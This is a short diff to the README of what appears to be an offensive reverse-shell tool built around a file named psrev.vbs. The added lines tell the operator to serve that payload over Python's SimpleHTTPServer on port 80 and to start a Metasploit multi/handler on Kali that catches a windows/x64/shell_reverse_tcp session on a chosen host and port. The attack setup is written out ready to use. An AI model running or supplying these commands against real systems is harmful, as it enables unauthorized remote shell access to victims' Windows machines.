@@ -36,7 +36,9 @@ This invocation method assumes that you are pasting the text into a shell on Kal
 ## More Preferred Method of Invocation
 **On Kali - Instructions**<br />
 Set up an HTTP server that is providing access to the psrev.vbs file.<br />
-Then...<br />
+python -m SimpleHTTPServer 80<br />
+Serving HTTP on 0.0.0.0 port 80 ...<br />
+Then in another terminal...<br />
 export HOSTIP=10.0.0.22;<br />
 export EXP1=5379;<br />
 msfconsole -q -x "setg LHOST $HOSTIP;use exploit/multi/handler;set ExitOnSession false;set PAYLOAD windows/x64/shell_reverse_tcp;set EXITFUNC thread;set LPORT $EXP1;exploit -j;";
